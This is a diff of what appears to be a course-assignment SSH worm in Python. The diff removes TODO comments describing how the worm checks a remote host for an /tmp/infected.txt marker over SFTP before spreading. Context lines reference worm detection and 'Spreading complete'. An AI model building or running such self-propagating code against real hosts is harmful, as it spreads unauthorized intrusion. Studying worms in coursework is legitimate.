@@ -232,33 +232,6 @@ if __name__ == "__main__":
 				else:
 					print("[ WORM ALREADY FOUND ]")
 				sshInfo[0].close()
-				# TODO: Check if the system was	
-				# already infected. This can be
-				# done by checking whether the
-				# remote system contains /tmp/infected.txt
-				# file (which the worm will place there
-				# when it first infects the system)
-				# This can be done using code similar to
-				# the code below:
-				# try:
-				#	 remotepath = '/tmp/infected.txt'
-				#        localpath = '/home/cpsc/'
-				#	 # Copy the file from the specified
-				#	 # remote path to the specified
-				# 	 # local path. If the file does exist
-				#	 # at the remote path, then get()
-				# 	 # will throw IOError exception
-				# 	 # (that is, we know the system is
-				# 	 # not yet infected).
-				# 
-				#        sftp.get(filepath, localpath)
-				# except IOError:
-				#       print "This system should be infected"
-				#
-				#
-				# If the system was already infected proceed.
-				# Otherwise, infect the system and terminate.
-				# Infect that system
 				
 				print("Spreading complete")	
 	exit()
